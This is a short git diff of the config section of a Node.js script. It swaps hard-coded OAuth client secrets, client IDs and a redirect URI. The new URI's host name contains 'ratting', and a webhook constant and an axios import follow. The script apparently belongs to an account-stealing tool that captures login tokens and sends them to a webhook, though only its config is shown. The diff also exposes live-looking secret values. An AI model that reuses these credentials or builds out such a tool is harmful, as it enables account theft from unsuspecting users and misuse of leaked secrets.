@@ -1,7 +1,7 @@
 //Config
-const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://d-na.herokuapp.com/'
+const secret_value = '-QS8Q~EnVX1Ki8_v3juWIENBOkX.pDnHnYLj2bJu'
+const client_id = 'bcbe7a05-a09a-4095-abf1-332c5e0ad44c'
+const redirect_uri = 'https://ratting-dvlw.onrender.com'
 const webhook_url = 'webhook'
 //Requirements
 const axios = require('axios')
